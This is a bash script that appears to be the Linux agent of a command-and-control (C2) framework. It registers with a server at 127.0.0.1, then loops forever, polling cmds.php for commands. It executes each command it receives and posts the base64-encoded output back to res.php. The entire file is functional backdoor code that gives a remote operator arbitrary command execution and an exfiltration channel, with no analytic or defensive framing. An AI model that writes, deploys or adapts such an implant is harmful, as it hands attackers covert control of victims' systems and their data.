
#Hello
curl -sk "https://127.0.0.1/res.php?res=$(echo "Hello from Agent $1 (Linux)" | base64)&id=$1" > /dev/null
while true
do
#grab 'n' run, skip if empty
run=$(curl -s 127.0.0.1/cmds.php?id=$1\&o=L | grep $1 | cut -f 2- -d ":")
if [ -z "$run" ];
then 
sleep 10
continue
fi
if [[ $2 == "debug" ]];
then
echo "Got a command : $run"
fi
res=$($run 2>&1| base64 | tr -d '\n')
#send result and clean command once exec
if [[ $2 == "debug" ]];
then
echo "Sending result : $res"
fi
curl -sk -X POST https://127.0.0.1/res.php -d "res=$(echo $res)&id=$1" > /dev/null
sleep 10
done
